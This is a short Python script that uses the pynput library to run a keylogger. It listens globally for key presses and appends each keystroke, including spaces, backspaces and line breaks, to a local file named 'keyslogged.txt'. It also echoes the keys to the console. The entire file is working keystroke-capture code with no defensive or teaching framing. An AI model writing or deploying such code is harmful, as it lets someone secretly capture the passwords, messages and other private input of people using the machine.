from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyslogged.txt", 'a') as logKey: #append pressed keys to file
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
           if key == keyboard.Key.space: # handles special case of spaces
               logKey.write(" ")
           elif key == keyboard.Key.backspace: # handles special case of backspaces
                logKey.seek(logKey.tell() - 1, 0)
                logKey.truncate()
           elif key == keyboard.Key.enter:
                logKey.write("\n")
           else:
               print("Error")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press = keyPressed)
    listener.start()
    input()